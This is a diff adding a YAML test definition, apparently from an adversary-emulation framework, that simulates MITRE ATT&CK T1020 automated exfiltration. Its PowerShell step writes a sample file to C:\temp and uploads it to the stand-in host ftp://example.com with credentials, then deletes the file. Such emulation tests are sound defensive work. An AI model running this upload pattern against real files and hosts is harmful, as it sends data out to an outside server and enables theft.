@@ -1,0 +1,18 @@
+- id: 65ed9764-2fbd-5fb8-839a-39956b6604ca
+  name: Soumaia ART Tests - Exfiltration via Encrypted FTP
+  description: Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.
+  tactic: exfiltration
+  technique:
+    attack_id: T1020
+    name: Automated Exfiltration
+  platforms:
+    windows:
+      psh:
+        command: |-
+          $sampleData = "Sample data for exfiltration test"
+          Set-Content -Path "C:\temp\T1020__FTP_sample.txt" -Value $sampleData
+          $ftpUrl = "ftp://example.com"
+          $creds = Get-Credential -Credential "[user:password]"
+          Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds
+        cleanup: |-
+          Remove-Item -Path "C:\temp\T1020__FTP_sample.txt" -ErrorAction Ignore
